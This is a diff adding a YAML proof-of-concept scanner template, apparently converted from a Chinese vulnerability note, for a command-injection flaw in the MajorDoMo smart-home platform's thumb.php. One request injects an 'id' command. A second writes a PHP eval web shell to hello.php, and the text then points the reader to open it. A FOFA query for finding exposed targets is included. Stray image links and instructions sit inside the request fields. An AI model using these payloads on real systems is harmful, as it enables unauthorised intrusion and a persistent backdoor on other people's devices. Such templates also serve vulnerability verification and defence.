@@ -1,0 +1,64 @@
+id: poc-fvwhqw79d7gxfsx1
+info:
+  name: 智能家居平台MajorDoMo thumb存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fvwhqw79d7gxfsx1'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fvwhqw79d7gxfsx1
+    fofa: title="MajordomoSL"
+http:
+- raw:
+  - 'GET /modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=%7C%7C+id%3B HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711659892-1adb00a9-3d45-4d9c-8b3f-fcc57e232e2b.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=%7C%7Cecho%20%27%3C%3Fphp%20@eval%28$_POST%5Bcmd%5D%29%3B%3F%3E%27%20%3E%20hello.php%3B HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711660105-0006211e-bc19-4e7c-ad68-1225bb57c227.png)
+
+    访问
+
+    Ip/hello.php
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711660325-e12ee727-04ac-4722-a090-f07f77a7db85.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
